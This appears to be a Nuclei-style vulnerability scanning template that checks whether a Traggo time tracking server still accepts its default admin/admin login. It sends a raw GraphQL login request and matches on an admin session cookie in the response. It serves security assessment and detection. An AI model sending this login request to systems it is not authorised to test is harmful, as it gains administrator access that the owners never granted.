id: traggo-default-credentials

info:
  name: Traggo - Default Credentials
  author: 0x_Akoko
  severity: high
  description: |
    Detected Traggo time tracking application was found using default admin credentials.
  reference:
    - https://traggo.net/first-login/
  metadata:
    max-request: 1
    verified: true
  tags: traggo,default-login,time-tracking

http:
  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"operationName":"Login","variables":{"name":"admin","pass":"admin","deviceType":"ShortExpiry"},"query":"mutation Login($name: String!, $pass: String!, $deviceType: DeviceType!) {\n  login(username: $name, pass: $pass, deviceName: \"web ui\", type: $deviceType, cookie: true) {\n    user {\n      id\n      name\n      admin\n      __typename\n    }\n    __typename\n  }\n}\n"}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "\"name\":\"admin\"")'
          - 'contains(body, "\"admin\":true") && contains(header, "traggo=")'
        condition: and
